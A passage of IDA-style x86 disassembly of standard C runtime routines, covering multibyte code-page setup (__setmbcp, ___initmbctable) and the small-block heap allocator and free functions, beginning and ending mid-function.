		mov	ebp, esp
		sub	esp, 1Ch
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, [ebp+CodePage]
		xor	ebx, ebx
		cmp	esi, 0FFFFFFFEh
		mov	[ebp+var_4], eax
		push	edi
		mov	dword_1010780, ebx
		jnz	short loc_100A188
		mov	dword_1010780, 1
		call	ds:__imp__GetOEMCP@0 ; GetOEMCP()
		jmp	short loc_100A1B3
; ---------------------------------------------------------------------------

loc_100A188:				; CODE XREF: __setmbcp+21j
		cmp	esi, 0FFFFFFFDh
		jnz	short loc_100A19F
		mov	dword_1010780, 1
		call	ds:__imp__GetACP@0 ; GetACP()
		jmp	short loc_100A1B3
; ---------------------------------------------------------------------------

loc_100A19F:				; CODE XREF: __setmbcp+38j
		cmp	esi, 0FFFFFFFCh
		jnz	short loc_100A1B8
		mov	eax, ___lc_codepage
		mov	dword_1010780, 1

loc_100A1B3:				; CODE XREF: __setmbcp+33j
					; __setmbcp+4Aj
		mov	[ebp+CodePage],	eax
		mov	esi, eax

loc_100A1B8:				; CODE XREF: __setmbcp+4Fj
		cmp	esi, ___mbcodepage
		jz	loc_100A327
		cmp	esi, ebx
		jz	loc_100A31D
		xor	edx, edx
		xor	eax, eax

loc_100A1D0:				; CODE XREF: __setmbcp+8Ej
		cmp	dword_100E378[eax], esi
		jz	short loc_100A23F
		add	eax, 30h
		inc	edx
		cmp	eax, 0F0h
		jb	short loc_100A1D0
		lea	eax, [ebp+CPInfo]
		push	eax		; lpCPInfo
		push	esi		; CodePage
		call	ds:__imp__GetCPInfo@8 ;	GetCPInfo(x,x)
		cmp	eax, 1
		jnz	loc_100A315
		push	40h
		xor	eax, eax
		pop	ecx
		mov	edi, offset __mbctype
		rep stosd
		stosb
		xor	edi, edi
		inc	edi
		cmp	[ebp+CPInfo.MaxCharSize], edi
		mov	___mbcodepage, esi
		mov	___mblcid, ebx
		jbe	loc_100A303
		cmp	[ebp+CPInfo.LeadByte], 0
		jz	loc_100A2DE
		lea	ecx, [ebp+CPInfo.LeadByte+1]

loc_100A229:				; CODE XREF: __setmbcp+185j
		mov	dl, [ecx]
		test	dl, dl
		jz	loc_100A2DE
		movzx	eax, byte ptr [ecx-1]
		movzx	edx, dl
		jmp	loc_100A2CE
; ---------------------------------------------------------------------------

loc_100A23F:				; CODE XREF: __setmbcp+83j
		push	40h
		xor	eax, eax
		pop	ecx
		mov	edi, offset __mbctype
		rep stosd
		lea	ecx, [edx+edx*2]
		shl	ecx, 4
		mov	[ebp+var_1C], ebx
		stosb
		lea	ebx, aJ[ecx]	; ""

loc_100A25B:				; CODE XREF: __setmbcp+145j
		mov	al, [ebx]
		mov	esi, ebx
		jmp	short loc_100A28A
; ---------------------------------------------------------------------------

loc_100A261:				; CODE XREF: __setmbcp+139j
		mov	dl, [esi+1]
		test	dl, dl
		jz	short loc_100A28E
		movzx	eax, al
		movzx	edi, dl
		cmp	eax, edi
		ja	short loc_100A286
		mov	edx, [ebp+var_1C]
		mov	dl, byte_100E370[edx]

loc_100A27B:				; CODE XREF: __setmbcp+131j
		or	byte_1011901[eax], dl
		inc	eax
		cmp	eax, edi
		jbe	short loc_100A27B

loc_100A286:				; CODE XREF: __setmbcp+11Dj
		inc	esi
		inc	esi
		mov	al, [esi]

loc_100A28A:				; CODE XREF: __setmbcp+10Cj
		test	al, al
		jnz	short loc_100A261

loc_100A28E:				; CODE XREF: __setmbcp+113j
		inc	[ebp+var_1C]
		add	ebx, 8
		cmp	[ebp+var_1C], 4
		jb	short loc_100A25B
		mov	eax, [ebp+CodePage]
		mov	___mbcodepage, eax
		mov	___ismbcodepage, 1
		call	_CPtoLCID
		lea	esi, aVyv[ecx]	; "`y!"
		mov	edi, offset ___mbulinfo
		movsd
		movsd
		mov	___mblcid, eax
		movsd
		jmp	short loc_100A322
; ---------------------------------------------------------------------------

loc_100A2C6:				; CODE XREF: __setmbcp+17Dj
		or	byte_1011901[eax], 4
		inc	eax

loc_100A2CE:				; CODE XREF: __setmbcp+E7j
		cmp	eax, edx
		jbe	short loc_100A2C6
		inc	ecx
		inc	ecx
		cmp	byte ptr [ecx-1], 0
		jnz	loc_100A229

loc_100A2DE:				; CODE XREF: __setmbcp+CDj
					; __setmbcp+DAj
		mov	eax, edi

loc_100A2E0:				; CODE XREF: __setmbcp+19Aj
		or	byte_1011901[eax], 8
		inc	eax
		cmp	eax, 0FFh
		jb	short loc_100A2E0
		mov	eax, esi
		call	_CPtoLCID
		mov	___mblcid, eax
		mov	___ismbcodepage, edi
		jmp	short loc_100A309
; ---------------------------------------------------------------------------

loc_100A303:				; CODE XREF: __setmbcp+C3j
		mov	___ismbcodepage, ebx

loc_100A309:				; CODE XREF: __setmbcp+1AEj
		xor	eax, eax
		mov	edi, offset ___mbulinfo
		stosd
		stosd
		stosd
		jmp	short loc_100A322
; ---------------------------------------------------------------------------

loc_100A315:				; CODE XREF: __setmbcp+9Ej
		cmp	dword_1010780, ebx
		jz	short loc_100A32B

loc_100A31D:				; CODE XREF: __setmbcp+73j
		call	sub_1009F87

loc_100A322:				; CODE XREF: __setmbcp+171j
					; __setmbcp+1C0j
		call	sub_1009FB7

loc_100A327:				; CODE XREF: __setmbcp+6Bj
		xor	eax, eax
		jmp	short loc_100A32E
; ---------------------------------------------------------------------------

loc_100A32B:				; CODE XREF: __setmbcp+1C8j
		or	eax, 0FFFFFFFFh

loc_100A32E:				; CODE XREF: __setmbcp+1D6j
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
__setmbcp	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


___initmbctable	proc near		; CODE XREF: __wincmdln+9p
					; __setenvp+Dp	...
		cmp	___mbctype_initialized,	0
		jnz	short loc_100A35B
		push	0FFFFFFFDh	; int
		call	__setmbcp
		pop	ecx
		mov	___mbctype_initialized,	1

loc_100A35B:				; CODE XREF: ___initmbctable+7j
		xor	eax, eax
		retn
___initmbctable	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___sbh_heap_init proc near		; CODE XREF: __heap_init+38p

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	140h		; dwBytes
		push	0		; dwFlags
		push	__crtheap	; hHeap
		call	ds:__imp__HeapAlloc@12 ; HeapAlloc(x,x,x)
		test	eax, eax
		mov	___sbh_pHeaderList, eax
		jnz	short loc_100A386
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_100A386:				; CODE XREF: ___sbh_heap_init+1Fj
		mov	ecx, [ebp+arg_0]
		and	___sbh_pHeaderDefer, 0
		and	___sbh_cntHeaderList, 0
		mov	___sbh_pHeaderScan, eax
		xor	eax, eax
		mov	___sbh_threshold, ecx
		mov	___sbh_sizeHeaderList, 10h
		inc	eax
		pop	ebp
		retn
___sbh_heap_init endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___sbh_find_block proc near		; CODE XREF: _free+17p

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, ___sbh_cntHeaderList
		lea	ecx, [eax+eax*4]
		mov	eax, ___sbh_pHeaderList
		lea	ecx, [eax+ecx*4]
		jmp	short loc_100A3DE
; ---------------------------------------------------------------------------

loc_100A3CD:				; CODE XREF: ___sbh_find_block+2Aj
		mov	edx, [ebp+arg_0]
		sub	edx, [eax+0Ch]
		cmp	edx, 100000h
		jb	short loc_100A3E4
		add	eax, 14h

loc_100A3DE:				; CODE XREF: ___sbh_find_block+15j
		cmp	eax, ecx
		jb	short loc_100A3CD
		xor	eax, eax

loc_100A3E4:				; CODE XREF: ___sbh_find_block+23j
		pop	ebp
		retn
___sbh_find_block endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___sbh_free_block proc near		; CODE XREF: _free+23p

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		mov	ecx, [ebp+arg_0]
		mov	eax, [ecx+10h]
		push	esi
		mov	esi, [ebp+arg_4]
		push	edi
		mov	edi, esi
		sub	edi, [ecx+0Ch]
		add	esi, 0FFFFFFFCh
		shr	edi, 0Fh
		mov	ecx, edi
		imul	ecx, 204h
		lea	ecx, [ecx+eax+144h]
		mov	[ebp+var_10], ecx
		mov	ecx, [esi]
		dec	ecx
		test	cl, 1
		mov	[ebp+var_4], ecx
		jnz	loc_100A701
		push	ebx
		lea	ebx, [ecx+esi]
		mov	edx, [ebx]
		mov	[ebp+var_C], edx
		mov	edx, [esi-4]
		mov	[ebp+var_8], edx
		mov	edx, [ebp+var_C]
		test	dl, 1
		mov	[ebp+arg_4], ebx
		jnz	short loc_100A4B8
		sar	edx, 4
		dec	edx
		cmp	edx, 3Fh
		jbe	short loc_100A450
		push	3Fh
		pop	edx

loc_100A450:				; CODE XREF: ___sbh_free_block+60j
		mov	ecx, [ebx+4]
		cmp	ecx, [ebx+8]
		jnz	short loc_100A49A
		cmp	edx, 20h
		mov	ebx, 80000000h
		jnb	short loc_100A47B
		mov	ecx, edx
		shr	ebx, cl
		lea	ecx, [edx+eax+4]
		not	ebx
		and	[eax+edi*4+44h], ebx
		dec	byte ptr [ecx]
		jnz	short loc_100A497
		mov	ecx, [ebp+arg_0]
		and	[ecx], ebx
		jmp	short loc_100A497
; ---------------------------------------------------------------------------

loc_100A47B:				; CODE XREF: ___sbh_free_block+75j
		lea	ecx, [edx-20h]
		shr	ebx, cl
		lea	ecx, [edx+eax+4]
		not	ebx
		and	[eax+edi*4+0C4h], ebx
		dec	byte ptr [ecx]
		jnz	short loc_100A497
		mov	ecx, [ebp+arg_0]
		and	[ecx+4], ebx

loc_100A497:				; CODE XREF: ___sbh_free_block+87j
					; ___sbh_free_block+8Ej ...
		mov	ebx, [ebp+arg_4]

loc_100A49A:				; CODE XREF: ___sbh_free_block+6Bj
		mov	edx, [ebx+8]
		mov	ebx, [ebx+4]
		mov	ecx, [ebp+var_4]
		add	ecx, [ebp+var_C]
		mov	[edx+4], ebx
		mov	edx, [ebp+arg_4]
		mov	ebx, [edx+4]
		mov	edx, [edx+8]
		mov	[ebx+8], edx
		mov	[ebp+var_4], ecx

loc_100A4B8:				; CODE XREF: ___sbh_free_block+57j
		mov	edx, ecx
		sar	edx, 4
		dec	edx
		cmp	edx, 3Fh
		jbe	short loc_100A4C6
		push	3Fh
		pop	edx

loc_100A4C6:				; CODE XREF: ___sbh_free_block+D6j
		mov	ebx, [ebp+var_8]
		and	ebx, 1
		mov	[ebp+var_C], ebx
		jnz	loc_100A564
		sub	esi, [ebp+var_8]
		mov	ebx, [ebp+var_8]
		sar	ebx, 4
		push	3Fh
		mov	[ebp+arg_4], esi
		dec	ebx
		pop	esi
		cmp	ebx, esi
		jbe	short loc_100A4EB
		mov	ebx, esi

loc_100A4EB:				; CODE XREF: ___sbh_free_block+FCj
		add	ecx, [ebp+var_8]
		mov	edx, ecx
		sar	edx, 4
		dec	edx
		cmp	edx, esi
		mov	[ebp+var_4], ecx
		jbe	short loc_100A4FD
		mov	edx, esi

loc_100A4FD:				; CODE XREF: ___sbh_free_block+10Ej
		cmp	ebx, edx
		jz	short loc_100A55F
		mov	ecx, [ebp+arg_4]
		mov	esi, [ecx+4]
		cmp	esi, [ecx+8]
		jnz	short loc_100A547
		cmp	ebx, 20h
		mov	esi, 80000000h
		jnb	short loc_100A52D
		mov	ecx, ebx
		shr	esi, cl
		not	esi
		and	[eax+edi*4+44h], esi
		dec	byte ptr [ebx+eax+4]
		jnz	short loc_100A547
		mov	ecx, [ebp+arg_0]
		and	[ecx], esi
		jmp	short loc_100A547
; ---------------------------------------------------------------------------

loc_100A52D:				; CODE XREF: ___sbh_free_block+129j
		lea	ecx, [ebx-20h]
		shr	esi, cl
		not	esi
		and	[eax+edi*4+0C4h], esi
		dec	byte ptr [ebx+eax+4]
		jnz	short loc_100A547
		mov	ecx, [ebp+arg_0]
		and	[ecx+4], esi

loc_100A547:				; CODE XREF: ___sbh_free_block+11Fj
					; ___sbh_free_block+139j ...
		mov	ecx, [ebp+arg_4]
		mov	esi, [ecx+8]
		mov	ecx, [ecx+4]
		mov	[esi+4], ecx
		mov	ecx, [ebp+arg_4]
		mov	esi, [ecx+4]
		mov	ecx, [ecx+8]
		mov	[esi+8], ecx

loc_100A55F:				; CODE XREF: ___sbh_free_block+114j
		mov	esi, [ebp+arg_4]
		jmp	short loc_100A567
; ---------------------------------------------------------------------------

loc_100A564:				; CODE XREF: ___sbh_free_block+E4j
		mov	ebx, [ebp+arg_0]

loc_100A567:				; CODE XREF: ___sbh_free_block+177j
		cmp	[ebp+var_C], 0
		jnz	short loc_100A575
		cmp	ebx, edx
		jz	loc_100A5F5

loc_100A575:				; CODE XREF: ___sbh_free_block+180j
		mov	ecx, [ebp+var_10]
		lea	ecx, [ecx+edx*8]
		mov	ebx, [ecx+4]
		mov	[esi+8], ecx
		mov	[esi+4], ebx
		mov	[ecx+4], esi
		mov	ecx, [esi+4]
		mov	[ecx+8], esi
		mov	ecx, [esi+4]
		cmp	ecx, [esi+8]
		jnz	short loc_100A5F5
		mov	cl, [edx+eax+4]
		mov	byte ptr [ebp+arg_4+3],	cl
		inc	cl
		cmp	edx, 20h
		mov	[edx+eax+4], cl
		jnb	short loc_100A5CC
		cmp	byte ptr [ebp+arg_4+3],	0
		jnz	short loc_100A5BB
		mov	ecx, edx
		mov	ebx, 80000000h
		shr	ebx, cl
		mov	ecx, [ebp+arg_0]
		or	[ecx], ebx

loc_100A5BB:				; CODE XREF: ___sbh_free_block+1C0j
		mov	ebx, 80000000h
		mov	ecx, edx
		shr	ebx, cl
		lea	eax, [eax+edi*4+44h]
		or	[eax], ebx
		jmp	short loc_100A5F5
; ---------------------------------------------------------------------------

loc_100A5CC:				; CODE XREF: ___sbh_free_block+1BAj
		cmp	byte ptr [ebp+arg_4+3],	0
		jnz	short loc_100A5E2
		lea	ecx, [edx-20h]
		mov	ebx, 80000000h
		shr	ebx, cl
		mov	ecx, [ebp+arg_0]
		or	[ecx+4], ebx

loc_100A5E2:				; CODE XREF: ___sbh_free_block+1E5j
		lea	ecx, [edx-20h]
		mov	edx, 80000000h
		shr	edx, cl
		lea	eax, [eax+edi*4+0C4h]
		or	[eax], edx

loc_100A5F5:				; CODE XREF: ___sbh_free_block+184j
					; ___sbh_free_block+1A8j ...
		mov	eax, [ebp+var_4]
		mov	[esi], eax
		mov	[eax+esi-4], eax
		mov	eax, [ebp+var_10]
		dec	dword ptr [eax]
		jnz	loc_100A700
		mov	eax, ___sbh_pHeaderDefer
		test	eax, eax
		jz	loc_100A6F2
		mov	ecx, ___sbh_indGroupDefer
		mov	esi, ds:__imp__VirtualFree@12 ;	VirtualFree(x,x,x)
		push	4000h		; dwFreeType
		shl	ecx, 0Fh
		add	ecx, [eax+0Ch]
		mov	ebx, 8000h
		push	ebx		; dwSize
		push	ecx		; lpAddress
		call	esi ; VirtualFree(x,x,x) ; VirtualFree(x,x,x)
		mov	ecx, ___sbh_indGroupDefer
		mov	eax, ___sbh_pHeaderDefer
		mov	edx, 80000000h
		shr	edx, cl
		or	[eax+8], edx
		mov	eax, ___sbh_pHeaderDefer
		mov	eax, [eax+10h]
		mov	ecx, ___sbh_indGroupDefer
		and	dword ptr [eax+ecx*4+0C4h], 0
		mov	eax, ___sbh_pHeaderDefer
		mov	eax, [eax+10h]
		dec	byte ptr [eax+43h]
		mov	eax, ___sbh_pHeaderDefer
		mov	ecx, [eax+10h]
		cmp	byte ptr [ecx+43h], 0
		jnz	short loc_100A683
		and	dword ptr [eax+4], 0FFFFFFFEh
		mov	eax, ___sbh_pHeaderDefer

loc_100A683:				; CODE XREF: ___sbh_free_block+28Dj
		cmp	dword ptr [eax+8], 0FFFFFFFFh
		jnz	short loc_100A6F2
		push	ebx		; dwFreeType
		push	0		; dwSize
		push	dword ptr [eax+0Ch] ; lpAddress
		call	esi ; VirtualFree(x,x,x) ; VirtualFree(x,x,x)
		mov	eax, ___sbh_pHeaderDefer
		push	dword ptr [eax+10h] ; lpMem
		push	0		; dwFlags
		push	__crtheap	; hHeap
		call	ds:__imp__HeapFree@12 ;	HeapFree(x,x,x)
		mov	eax, ___sbh_cntHeaderList
		mov	edx, ___sbh_pHeaderList
		lea	eax, [eax+eax*4]
		shl	eax, 2
		mov	ecx, eax
		mov	eax, ___sbh_pHeaderDefer
		sub	ecx, eax
		lea	ecx, [ecx+edx-14h]
		push	ecx		; Size
		lea	ecx, [eax+14h]
		push	ecx		; Src
		push	eax		; Dst
		call	_memmove
		mov	eax, [ebp+arg_0]
		add	esp, 0Ch
		dec	___sbh_cntHeaderList
		cmp	eax, ___sbh_pHeaderDefer
		jbe	short loc_100A6E8
		sub	[ebp+arg_0], 14h

loc_100A6E8:				; CODE XREF: ___sbh_free_block+2F7j
		mov	eax, ___sbh_pHeaderList
		mov	___sbh_pHeaderScan, eax

loc_100A6F2:				; CODE XREF: ___sbh_free_block+225j
					; ___sbh_free_block+29Cj
		mov	eax, [ebp+arg_0]
		mov	___sbh_pHeaderDefer, eax
		mov	___sbh_indGroupDefer, edi

loc_100A700:				; CODE XREF: ___sbh_free_block+218j
		pop	ebx

loc_100A701:				; CODE XREF: ___sbh_free_block+39j
		pop	edi
		pop	esi
		leave
		retn
___sbh_free_block endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


___sbh_alloc_new_region	proc near	; CODE XREF: ___sbh_alloc_block+152p
		mov	eax, ___sbh_cntHeaderList
		mov	ecx, ___sbh_sizeHeaderList
		push	edi
		xor	edi, edi
		cmp	eax, ecx
		jnz	short loc_100A750
		lea	eax, [ecx+ecx*4+50h]
		shl	eax, 2
		push	eax		; dwBytes
		push	___sbh_pHeaderList ; lpMem
		push	edi		; dwFlags
		push	__crtheap	; hHeap
		call	ds:__imp__HeapReAlloc@16 ; HeapReAlloc(x,x,x,x)
		cmp	eax, edi
		jnz	short loc_100A73F
		xor	eax, eax
		pop	edi
		retn
; ---------------------------------------------------------------------------

loc_100A73F:				; CODE XREF: ___sbh_alloc_new_region+2Fj
		add	___sbh_sizeHeaderList, 10h
		mov	___sbh_pHeaderList, eax
		mov	eax, ___sbh_cntHeaderList

loc_100A750:				; CODE XREF: ___sbh_alloc_new_region+10j
		mov	ecx, ___sbh_pHeaderList
		push	esi
		push	41C4h		; dwBytes
		push	8		; dwFlags
		push	__crtheap	; hHeap
		lea	eax, [eax+eax*4]
		lea	esi, [ecx+eax*4]
		call	ds:__imp__HeapAlloc@12 ; HeapAlloc(x,x,x)
		cmp	eax, edi
		mov	[esi+10h], eax
		jnz	short loc_100A77B

loc_100A777:				; CODE XREF: ___sbh_alloc_new_region+9Bj
		xor	eax, eax
		jmp	short loc_100A7BE
; ---------------------------------------------------------------------------

loc_100A77B:				; CODE XREF: ___sbh_alloc_new_region+6Bj
		push	4		; flProtect
		push	2000h		; flAllocationType
		push	100000h		; dwSize
		push	edi		; lpAddress
		call	ds:__imp__VirtualAlloc@16 ; VirtualAlloc(x,x,x,x)
		cmp	eax, edi
		mov	[esi+0Ch], eax
		jnz	short loc_100A7A7
		push	dword ptr [esi+10h] ; lpMem
		push	edi		; dwFlags
		push	__crtheap	; hHeap
		call	ds:__imp__HeapFree@12 ;	HeapFree(x,x,x)
		jmp	short loc_100A777
; ---------------------------------------------------------------------------

loc_100A7A7:				; CODE XREF: ___sbh_alloc_new_region+89j
		or	dword ptr [esi+8], 0FFFFFFFFh
		mov	[esi], edi
		mov	[esi+4], edi
		inc	___sbh_cntHeaderList
		mov	eax, [esi+10h]
		or	dword ptr [eax], 0FFFFFFFFh
		mov	eax, esi

loc_100A7BE:				; CODE XREF: ___sbh_alloc_new_region+6Fj
		pop	esi
		pop	edi
		retn
___sbh_alloc_new_region	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___sbh_alloc_new_group proc near	; CODE XREF: ___sbh_alloc_block+161p

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		mov	ecx, [ebp+arg_0]
		mov	eax, [ecx+8]
		push	ebx
		push	esi
		mov	esi, [ecx+10h]
		push	edi
		xor	ebx, ebx
		jmp	short loc_100A7E0
; ---------------------------------------------------------------------------

loc_100A7DD:				; CODE XREF: ___sbh_alloc_new_group+1Cj
		shl	eax, 1
		inc	ebx

loc_100A7E0:				; CODE XREF: ___sbh_alloc_new_group+15j
		test	eax, eax
		jge	short loc_100A7DD
		mov	eax, ebx
		imul	eax, 204h
		lea	eax, [eax+esi+144h]
		push	3Fh
		mov	[ebp+var_8], eax
		pop	edx

loc_100A7F9:				; CODE XREF: ___sbh_alloc_new_group+3Dj
		mov	[eax+8], eax
		mov	[eax+4], eax
		add	eax, 8
		dec	edx
		jnz	short loc_100A7F9
		push	4		; flProtect
		mov	edi, ebx
		push	1000h		; flAllocationType
		shl	edi, 0Fh
		add	edi, [ecx+0Ch]
		push	8000h		; dwSize
		push	edi		; lpAddress
		call	ds:__imp__VirtualAlloc@16 ; VirtualAlloc(x,x,x,x)
		test	eax, eax
		jnz	short loc_100A82C
		or	eax, 0FFFFFFFFh
		jmp	loc_100A8C9
; ---------------------------------------------------------------------------

loc_100A82C:				; CODE XREF: ___sbh_alloc_new_group+5Cj
		lea	edx, [edi+7000h]
		cmp	edi, edx
		mov	[ebp+var_4], edx
		ja	short loc_100A87C
		mov	ecx, edx
		sub	ecx, edi
		shr	ecx, 0Ch
		lea	eax, [edi+10h]
		inc	ecx

loc_100A844:				; CODE XREF: ___sbh_alloc_new_group+B1j
		or	dword ptr [eax-8], 0FFFFFFFFh
		or	dword ptr [eax+0FECh], 0FFFFFFFFh
		lea	edx, [eax+0FFCh]
		mov	[eax], edx
		lea	edx, [eax-1004h]
		mov	dword ptr [eax-4], 0FF0h
		mov	[eax+4], edx
		mov	dword ptr [eax+0FE8h], 0FF0h
		add	eax, 1000h
		dec	ecx
		jnz	short loc_100A844
		mov	edx, [ebp+var_4]

loc_100A87C:				; CODE XREF: ___sbh_alloc_new_group+71j
		mov	eax, [ebp+var_8]
		add	eax, 1F8h
		lea	ecx, [edi+0Ch]
		mov	[eax+4], ecx
		mov	[ecx+8], eax
		lea	ecx, [edx+0Ch]
		mov	[eax+8], ecx
		mov	[ecx+4], eax
		and	dword ptr [esi+ebx*4+44h], 0
		xor	edi, edi
		inc	edi
		mov	[esi+ebx*4+0C4h], edi
		mov	al, [esi+43h]
		mov	cl, al
		inc	cl
		test	al, al
		mov	eax, [ebp+arg_0]
		mov	[esi+43h], cl
		jnz	short loc_100A8B9
		or	[eax+4], edi

loc_100A8B9:				; CODE XREF: ___sbh_alloc_new_group+EEj
		mov	edx, 80000000h
		mov	ecx, ebx
		shr	edx, cl
		not	edx
		and	[eax+8], edx
		mov	eax, ebx

loc_100A8C9:				; CODE XREF: ___sbh_alloc_new_group+61j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
___sbh_alloc_new_group endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___sbh_alloc_block proc	near		; CODE XREF: __heap_alloc+1Bp
					; _calloc+4Ap

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		mov	ecx, [ebp+arg_0]
		mov	eax, ___sbh_cntHeaderList
		mov	edx, ___sbh_pHeaderList
		add	ecx, 17h
		and	ecx, 0FFFFFFF0h
		push	ebx
		mov	[ebp+var_10], ecx
		sar	ecx, 4
		push	esi
		lea	eax, [eax+eax*4]
		push	edi
		dec	ecx
		cmp	ecx, 20h
		lea	edi, [edx+eax*4]
		mov	[ebp+var_4], edi
		jge	short loc_100A912
		or	esi, 0FFFFFFFFh
		shr	esi, cl
		or	[ebp+var_8], 0FFFFFFFFh
		jmp	short loc_100A91F
; ---------------------------------------------------------------------------

loc_100A912:				; CODE XREF: ___sbh_alloc_block+32j
		add	ecx, 0FFFFFFE0h
		or	eax, 0FFFFFFFFh
		xor	esi, esi
		shr	eax, cl
		mov	[ebp+var_8], eax

loc_100A91F:				; CODE XREF: ___sbh_alloc_block+3Dj
		mov	eax, ___sbh_pHeaderScan
		mov	ebx, eax
		mov	[ebp+var_C], esi
		cmp	ebx, edi
		jmp	short loc_100A941
; ---------------------------------------------------------------------------

loc_100A92D:				; CODE XREF: ___sbh_alloc_block+71j
		mov	ecx, [ebx+4]
		mov	edi, [ebx]
		and	ecx, [ebp+var_8]
		and	edi, esi
		or	ecx, edi
		jnz	short loc_100A946
		add	ebx, 14h
		cmp	ebx, [ebp+var_4]

loc_100A941:				; CODE XREF: ___sbh_alloc_block+58j
		mov	[ebp+arg_0], ebx
		jb	short loc_100A92D

loc_100A946:				; CODE XREF: ___sbh_alloc_block+66j
		cmp	ebx, [ebp+var_4]
		jnz	short loc_100A96F
		mov	ebx, edx
		jmp	short loc_100A960
; ---------------------------------------------------------------------------

loc_100A94F:				; CODE XREF: ___sbh_alloc_block+92j
		mov	ecx, [ebx+4]
		mov	edi, [ebx]
		and	ecx, [ebp+var_8]
		and	edi, esi
		or	ecx, edi
		jnz	short loc_100A967
		add	ebx, 14h

loc_100A960:				; CODE XREF: ___sbh_alloc_block+7Aj
		cmp	ebx, eax
		mov	[ebp+arg_0], ebx
		jb	short loc_100A94F

loc_100A967:				; CODE XREF: ___sbh_alloc_block+88j
		cmp	ebx, eax
		jz	loc_100AA03

loc_100A96F:				; CODE XREF: ___sbh_alloc_block+76j
					; ___sbh_alloc_block+172j
		mov	___sbh_pHeaderScan, ebx
		mov	eax, [ebx+10h]
		mov	edx, [eax]
		cmp	edx, 0FFFFFFFFh
		mov	[ebp+var_4], edx
		jz	short loc_100A996
		mov	ecx, [eax+edx*4+0C4h]
		mov	edi, [eax+edx*4+44h]
		and	ecx, [ebp+var_8]
		and	edi, esi
		or	ecx, edi
		jnz	short loc_100A9CC

loc_100A996:				; CODE XREF: ___sbh_alloc_block+ADj
		mov	edx, [eax+0C4h]
		and	edx, [ebp+var_8]
		and	[ebp+var_4], 0
		lea	ecx, [eax+44h]
		mov	esi, [ecx]
		and	esi, [ebp+var_C]
		or	edx, esi
		mov	esi, [ebp+var_C]
		jnz	short loc_100A9C9

loc_100A9B2:				; CODE XREF: ___sbh_alloc_block+F4j
		mov	edx, [ecx+84h]
		and	edx, [ebp+var_8]
		inc	[ebp+var_4]
		add	ecx, 4
		mov	edi, [ecx]
		and	edi, esi
		or	edx, edi
		jz	short loc_100A9B2

loc_100A9C9:				; CODE XREF: ___sbh_alloc_block+DDj
		mov	edx, [ebp+var_4]

loc_100A9CC:				; CODE XREF: ___sbh_alloc_block+C1j
		mov	ecx, edx
		imul	ecx, 204h
		lea	ecx, [ecx+eax+144h]
		mov	[ebp+var_C], ecx
		mov	ecx, [eax+edx*4+44h]
		xor	edi, edi
		and	ecx, esi
		jnz	short loc_100AA55
		mov	ecx, [eax+edx*4+0C4h]
		and	ecx, [ebp+var_8]
		push	20h
		pop	edi
		jmp	short loc_100AA55
; ---------------------------------------------------------------------------

loc_100A9F7:				; CODE XREF: ___sbh_alloc_block+133j
		cmp	dword ptr [ebx+8], 0
		jnz	short loc_100AA08
		add	ebx, 14h
		mov	[ebp+arg_0], ebx

loc_100AA03:				; CODE XREF: ___sbh_alloc_block+96j
		cmp	ebx, [ebp+var_4]
		jb	short loc_100A9F7

loc_100AA08:				; CODE XREF: ___sbh_alloc_block+128j
		cmp	ebx, [ebp+var_4]
		jnz	short loc_100AA33
		mov	ebx, edx
		jmp	short loc_100AA1A
; ---------------------------------------------------------------------------

loc_100AA11:				; CODE XREF: ___sbh_alloc_block+14Cj
		cmp	dword ptr [ebx+8], 0
		jnz	short loc_100AA21
		add	ebx, 14h

loc_100AA1A:				; CODE XREF: ___sbh_alloc_block+13Cj
		cmp	ebx, eax
		mov	[ebp+arg_0], ebx
		jb	short loc_100AA11

loc_100AA21:				; CODE XREF: ___sbh_alloc_block+142j
		cmp	ebx, eax
		jnz	short loc_100AA33
		call	___sbh_alloc_new_region
		mov	ebx, eax
		test	ebx, ebx
		mov	[ebp+arg_0], ebx
		jz	short loc_100AA4B

loc_100AA33:				; CODE XREF: ___sbh_alloc_block+138j
					; ___sbh_alloc_block+150j
		push	ebx
		call	___sbh_alloc_new_group
		pop	ecx
		mov	ecx, [ebx+10h]
		mov	[ecx], eax
		mov	eax, [ebx+10h]
		cmp	dword ptr [eax], 0FFFFFFFFh
		jnz	loc_100A96F

loc_100AA4B:				; CODE XREF: ___sbh_alloc_block+15Ej
		xor	eax, eax
		jmp	loc_100ABCC
; ---------------------------------------------------------------------------

loc_100AA52:				; CODE XREF: ___sbh_alloc_block+184j
		shl	ecx, 1
		inc	edi

loc_100AA55:				; CODE XREF: ___sbh_alloc_block+113j
					; ___sbh_alloc_block+122j
		test	ecx, ecx
		jge	short loc_100AA52
		mov	ecx, [ebp+var_C]
		mov	edx, [ecx+edi*8+4]
